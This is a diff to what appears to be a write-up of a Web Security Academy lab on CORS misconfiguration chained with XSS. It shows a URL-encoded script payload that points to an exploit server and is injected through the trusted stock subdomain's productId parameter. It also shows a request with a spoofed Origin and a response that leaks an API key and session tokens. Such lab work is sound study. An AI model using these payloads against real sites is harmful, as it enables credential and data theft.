@@ -96,3 +96,33 @@ var data = "%3Cscript%3E%20var%20EXPURL%20%3D%20%27https%3A%2F%2Fexploit%2D0a740
 window.open('http://stock.0a660041031c2f37c0fe4299000b0099.web-security-academy.net/?productId='+data+'&storeId=1', 'stock', 'height=10,width=10,left=10,top=10,menubar=no,toolbar=no,location=no,status=no');
 </script>                   
 ```
+
+Other - Subdomain reflection test
+
+```
+GET /accountDetails HTTP/1.1
+Host: 0a660041031c2f37c0fe4299000b0099.web-security-academy.net
+Origin: http://stock.0a660041031c2f37c0fe4299000b0099.web-security-academy.net
+Cookie: session=s2fGlgSGMUqAtID7Toxuk6vxzAV6kkay
+Connection: close
+```
+
+Passed through to access control allow origin
+```
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://stock.0a660041031c2f37c0fe4299000b0099.web-security-academy.net
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 189
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "xzVvSPRWWgCfiqTxo64ZFVJfTgO8NEbu",
+  "sessions": [
+    "caR76YazqabcI0oVd4zn87BAe3Anp1GT",
+    "s2fGlgSGMUqAtID7Toxuk6vxzAV6kkay"
+  ]
+}
+```
